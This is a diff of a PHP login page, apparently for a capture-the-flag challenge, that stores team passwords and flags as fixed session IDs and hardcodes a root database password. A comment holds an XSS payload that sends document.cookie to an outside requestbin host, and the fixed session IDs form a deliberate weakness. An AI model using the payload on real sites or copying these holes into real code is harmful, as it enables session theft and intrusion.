@@ -10,13 +10,22 @@
 <body>
 <div class="container">
 <?php
+$passA='Bi3nvenueT3amA';
+$passB='BiEnvenu3TeamB';
+$flagA='ahahbi3njoueJ3su6slefl4g';
+$flagB='ohohcbi3njoueJ3su6slefl4g';
+
 if (isset($_POST['access']))
 {	
-	if($_POST['pass']=='Bi3nvenueT3amA'){
-		echo 'ok';
-		session_id ('ahahbi3njoueJ3su6slefl4g');
+	if($_POST['pass']==$passA){
+		session_id ($flagA);
 		session_start();
-		$_SESSION['team']='A';
+		$_SESSION['connected']='yes';
+	}
+	if($_POST['pass']==$passB){
+		session_id ($flagB);
+		session_start();
+		$_SESSION['connected']='yes';
 	}
 }
 
@@ -24,7 +33,7 @@ if (isset($_POST['access']))
 //"<script>document.write(\'<img src=\"http://requestbin.fullcontact.com/1ap2jla1?cookie==\'+document.cookie+\'\">aaaa</img>\');</script>"
 
 session_start();
-if(isset($_SESSION['team']) and ($_SESSION['team']=='A')){
+if(isset($_SESSION['connected']) and ($_SESSION['connected']=='yes')){
 try {
 		$bdd = new PDO ('mysql:host=localhost;dbname=ctf','root','Azerty@123');
 	}
